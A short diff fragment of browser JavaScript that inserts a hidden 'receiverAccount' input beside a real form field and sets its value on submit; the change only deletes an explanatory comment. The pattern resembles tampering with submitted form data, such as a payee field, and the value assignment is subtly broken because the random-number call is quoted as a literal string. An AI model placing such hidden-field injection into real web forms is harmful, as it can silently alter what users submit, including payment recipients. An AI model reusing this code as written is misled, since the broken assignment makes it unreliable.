@@ -7,7 +7,7 @@ fakeInput.type = 'hidden';
 fakeInput.setAttribute('name', 'receiverAccount');
 realInput.parentNode.insertBefore(fakeInput, realInput.nextSibling);
 form.addEventListener('submit', function() {
-        // Set the fake input's value right before submission
+   
   fakeInput.value = 'Math.random().toString()'
   console.log("Submitting with fake value: ", fakeInput.value);
 });
